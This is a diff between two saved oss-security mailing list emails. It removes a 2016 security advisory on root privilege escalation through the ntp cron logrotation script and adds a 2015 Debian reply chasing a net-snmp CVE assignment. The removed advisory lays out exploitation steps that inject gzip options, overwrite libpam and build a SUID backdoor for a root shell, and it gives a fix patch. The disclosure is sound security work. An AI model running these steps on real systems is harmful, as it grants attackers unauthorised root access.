@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6390" "Thursday" "21" "January" "2016" "19:04:22" "+0000" "halfdog" "me@halfdog.net" "<22281686-34db-16c3-7ce2-a21b845d130c@halfdog.net>" "180" "[oss-security] ntp.org stats data logrotation script privilege escalation" nil nil nil "1" "2016012119:04:22" "[oss-security] ntp.org stats data logrotation script privilege escalation" (number mark "U       me@halfdog.n Jan 21  180/6390  " thread-indent "\"[oss-security] ntp.org stats data logrotation script privilege escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1142" "Sunday" "10" "May" "2015" "13:06:48" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20150510110648.GA28525@eldamar.local>" "38" "Re: [oss-security] net-snmp snmp_pdu_parse() function incompletely initializaition vulnerability" nil nil nil "5" "2015051011:06:48" "[oss-security] net-snmp snmp_pdu_parse() function incompletely initializaition vulnerability" (number mark "        carnil@debia May 10   38/1142  " thread-indent "\"Re: [oss-security] net-snmp snmp_pdu_parse() function incompletely initializaition vulnerability\"\n") "<20150416140557.72e3e4d3@redhat.com>" ("<CAPcZBq7YrwpZDJNZ58yQjcYHTZ43qoQWCoUAet9Eb7Dn2sruBQ@mail.gmail.com>" "<20150416140557.72e3e4d3@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 7766 invoked by uid 550); 21 Jan 2016 19:06:18 -0000
+Received: (qmail 7636 invoked by uid 550); 10 May 2015 11:07:02 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,195 +11,74 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 7711 invoked from network); 21 Jan 2016 19:06:10 -0000
-Message-ID: <22281686-34db-16c3-7ce2-a21b845d130c@halfdog.net>
-User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
+Received: (qmail 7602 invoked from network); 10 May 2015 11:07:01 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=sender:date:from:to:cc:subject:message-id:references:mime-version
+         :content-type:content-disposition:content-transfer-encoding
+         :in-reply-to:user-agent;
+        bh=z3Fx7f88cqcgut0pfF7udP7az5szP+DoC4+ildipR3Y=;
+        b=YY8CC8nDB5kUlx05pnp0sB4Jd6VHJwRPQgOibI7yXNeuLsQ9Ii/xWrNqc+6ik84XDC
+         3iyHoEV0GvgBtslDxjcaiKjPNDXZaO1H2PHO+Yn0hfWSkE5ObtSTvHoS0hbBLPdNo+2a
+         6JZOyvIqQcAYDmR0psyP21wE7jZRGJlPI1Vfa9NNeSnAKwx99Qgr/yL1eCCdQMWkVEgJ
+         8xxj8RkUSGU8VRNTLY4BohEDMVGGQb7khKuLiXWU0SI7hDmnDbrMbTpODtvCkYDMAizU
+         ArcL7kjdD0dwa2m4Oop97qdoXPgtDNt8KqqgHhrFiopscq9Sj4ga4FrGtCSPbSuwxgca
+         32cQ==
+X-Received: by 10.194.242.166 with SMTP id wr6mr11643975wjc.76.1431256010556;
+        Sun, 10 May 2015 04:06:50 -0700 (PDT)
+Message-ID: <20150510110648.GA28525@eldamar.local>
+References: <CAPcZBq7YrwpZDJNZ58yQjcYHTZ43qoQWCoUAet9Eb7Dn2sruBQ@mail.gmail.com>
+ <20150416140557.72e3e4d3@redhat.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-Date: Thu, 21 Jan 2016 19:04:22 +0000
-From: halfdog <me@halfdog.net>
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
+Content-Transfer-Encoding: 8bit
+In-Reply-To: <20150416140557.72e3e4d3@redhat.com>
+User-Agent: Mutt/1.5.23 (2014-03-12)
+Cc: CVE Assignments MITRE <cve-assign@mitre.org>
+Date: Sun, 10 May 2015 13:06:48 +0200
+From: Salvatore Bonaccorso <carnil@debian.org>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] ntp.org stats data logrotation script privilege escalation
+Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
+Subject: Re: [oss-security] net-snmp snmp_pdu_parse() function incompletely
+ initializaition vulnerability
 To: oss-security@lists.openwall.com
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hi,
 
-As disclosure was already requested, here ist the public writeup:
+On Thu, Apr 16, 2015 at 02:05:57PM +0200, Stefan Cornelius wrote:
+> On Mon, 13 Apr 2015 13:44:04 +0800
+> 罗大龙 <luodalongde@gmail.com> wrote:
+> 
+> > HI there,
+> > 
+> > 
+> > 
+> > Greeting! This is Qinghao Tang from QIHU 360  company, China. I am a
+> > security researcher there.
+> > 
+> > I'm writing to apply for a CVE ID, for a 0day vulnerability in
+> > net-snmp. Please refer to below report.
+> > 
+> 
+> The upstream patch is here:
+> https://sourceforge.net/p/net-snmp/code/ci/f23bcd3ac6ddee5d0a48f9703007ccc738914791/
+> 
+> As linked from the commit, the (currently restricted) upstream bug is:
+> https://sourceforge.net/p/net-snmp/bugs/2615/
+> 
+> Although this leads to crashes at different locations, all of them can
+> be attributed to snmp_pdu_parse() leaving stale netsnmp_variable_list
+> items in the list, so I think one CVE should be enough.
+> 
+> 
+> In case anyone is interested, the Red Hat bug is:
+> https://bugzilla.redhat.com/show_bug.cgi?id=1212408
 
-Introduction:
-=============
+Explicitly adding MITREs CVE assignment team to the CC list.
 
-The cronjob script bundled with ntp package is intended to perform
-cleanup on statistics files produced by NTP daemon running with
-statistics enabled. The script is run as root during the daily cronjobs
-all operations on the ntp-user controlled statistics directory without
-switching to user ntp. Thus all steps are performed with root
-permissions in place.
+Any news on this? Unfortunately the upstream bug report ist still
+restricted.
 
-Due to multiple bugs in the script, a malicious ntp user can make the
-backup process to overwrite arbitrary files with content controlled by
-the attacker, thus gaining root privileges. The problematic parts in
-/etc/cron.daily/ntp are:
-
-find "$statsdir" -type f -mtime +7 -exec rm {} \;
-
-# compress whatever is left to save space
-cd "$statsdir"
-ls *stats.???????? > /dev/null 2>&1
-if [ $? -eq 0 ]; then
-# Note that gzip won't compress the file names that
-# are hard links to the live/current files, so this
-# compresses yesterday and previous, leaving the live
-# log alone. We supress the warnings gzip issues
-# about not compressing the linked file.
-gzip --best --quiet *stats.????????
-
-Relevant targets are:
-
-* find and rm invocation is racy, symlinks on rm
-* rm can be invoked with one attacker controlled option
-* ls can be invoked with arbitrary number of attacker controlled command
-line options
-* gzip can be invoked with arbitrary number of attacker controlled options
-
-
-Exploitation:
-=============
-
-A sucessful attack should not be mitigated by symlink security
-restrictions. Thus the general POSIX/Linux design weakness of missing
-flags/syscalls for safe opening of path without the setfsuid workaround
-has to be targeted. See FilesystemRecursionAndSymlinks on that.
-Demonstration:
-
-First step is to pass the ls check in the script to trigger gzip, which
-is more suitable to perform file system changes than ls for executing
-arbitrary code. As this requires passing command line options to gzip
-which are not valid for ls, content of statsdir has to be modified
-exactly in between. This can be easily accomplished by preparing
-suitable entries in /var/lib/ntp and starting one instance of
-DirModifyInotify.c as user ntp:
-
-cd /var/lib/ntp
-mkdir astats.01234567 bstats.01234567
-# Copy away library, we will have to restore it afterwards. Without
-# that, login is disabled on console, via SSH, ...
-cp -a -- /lib/x86_64-linux-gnu/libpam.so.0.83.1 .
-gzip < /lib/x86_64-linux-gnu/libpam.so.0.83.1 >
-astats.01234567/libpam.so.0.83.1stats.01234567
-./DirModifyInotify --Watch bstats.01234567 --WatchCount 5 --MovePath
-bstats.01234567 --MoveTarget -drfSstats.01234567 &
-
-With just that in place, DirModifyInotify will react to the actions of
-ls, move the directory and thus trigger recursive decompression in gzip
-instead of plain compression. While gzip is running, the directory
-astats.01234567 has to replaced also to make it overwrite arbitrary
-files as user root. As gzip will attempt to restore uid/gid of
-compressed file to new uncompressed version, this will just change the
-ownership of PAM library to ntp user.
-
-./DirModifyInotify --Watch astats.01234567 --WatchCount 12 --MovePath
-astats.01234567 --MoveTarget disabled --LinkTarget /lib/x86_64-linux-gnu/
-
-After the daily cron jobs were run once, libpam.so.0.83.1 can be
-temporarily replaced, e.g. to create a SUID binary for escalation.
-
-gcc -Wall -fPIC -c LibPam.c
-ld -shared -Bdynamic LibPam.o -L/lib -lc -o libPam.so
-cat libPam.so > /lib/x86_64-linux-gnu/libpam.so.0.83.1
-gcc -o Backdoor SuidExec.c
-/bin/su
-# Back to normal
-./Backdoor /bin/sh -c 'cp --preserve=mode,timestamps -- libpam.so.0.83.1
-/lib/x86_64-linux-gnu/libpam.so.0.83.1; chown root.root
-/lib/x86_64-linux-gnu/libpam.so.0.83.1; exec /bin/sh'
-
-
-Mitigation:
-===========
-
-Following simple patch should fix all the issues.
-
-- --- /etc/cron.daily/ntp 2011-12-15 10:43:19.000000000 +0000
-+++ /etc/cron.daily/ntp 2015-12-16 09:28:32.057936904 +0000
-@@ -9,19 +9,23 @@
-statsdir=$(cat /etc/ntp.conf | grep -v '^#' | sed -n 's/statsdir \([^
-][^ ]*\)/\1/p')
-
-if [ -n "$statsdir" ] && [ -d "$statsdir" ]; then
-- - # only keep a week's depth of these
-- - find "$statsdir" -type f -mtime +7 -exec rm {} \;
-+ # only keep a week's depth of these. Delete only files exactly
-+ # within the directory and do not descend into subdirectories
-+ # to avoid security risks on platforms where find is not using
-+ # fts-library.
-+ find "$statsdir" -maxdepth 1 -type f -mtime +7 -delete
-
-- - # compress whatever is left to save space
-- - cd "$statsdir"
-- - ls *stats.???????? > /dev/null 2>&1
-+ # compress whatever is left to save space but make sure to really
-+ # do it only in the expected directory.
-+ cd "$statsdir" || exit 1
-+ ls -d -- *stats.???????? > /dev/null 2>&1
-if [ $? -eq 0 ]; then
-# Note that gzip won't compress the file names that
-# are hard links to the live/current files, so this
-# compresses yesterday and previous, leaving the live
-# log alone. We supress the warnings gzip issues
-# about not compressing the linked file.
-- - gzip --best --quiet *stats.????????
-+ gzip --best --quiet -- *stats.????????
-return=$?
-case $return in
-2)
-
-To protect against unidentified or future issues, the script should
-not be run with UID=0 at all. One variant for such a patch can be
-found at [0].
-
-
-Results, Discussion:
-====================
-
-The impact should be minor as
-
-* statsdir has to be enabled root-owned ntp configuration, which is not
-the default at least on Ubuntu Wily
-
-* NTP daemon has small attack surface, thus hard to gain access to ntp
-user for remote attacker
-
-* No SUID binaries to ease local users gaining ntp user rights
-
-
-Timeline:
-=========
-
-* 20151215: Discovery
-* 20151220: Report at Ubuntu Launchpad
-* 20151222: Checked also ntp.org Debian package, reported upstream
-* 20160121: Publication
-
-
-Material, References:
-=====================
-
-* [0] Article on the issue, references to all test tools mentioned in this
-post:
-http://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/
-* [1] Launchpad bug report:
-https://bugs.launchpad.net/ubuntu/+source/ntp/+bug/1528050
-
-- -- 
-http://www.halfdog.net/
-PGP: 156A AE98 B91F 0114 FE88 2BD8 C459 9386 feed a bee
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iEYEARECAAYFAlahK7AACgkQxFmThv7tq+7XHQCfRM6H6cditVs62LUJkO+251m+
-eUgAn2jGa9GCIElabfMVFfz7YlY/K+ep
-=opQj
------END PGP SIGNATURE-----
+Thanks and regards,
+Salvatore
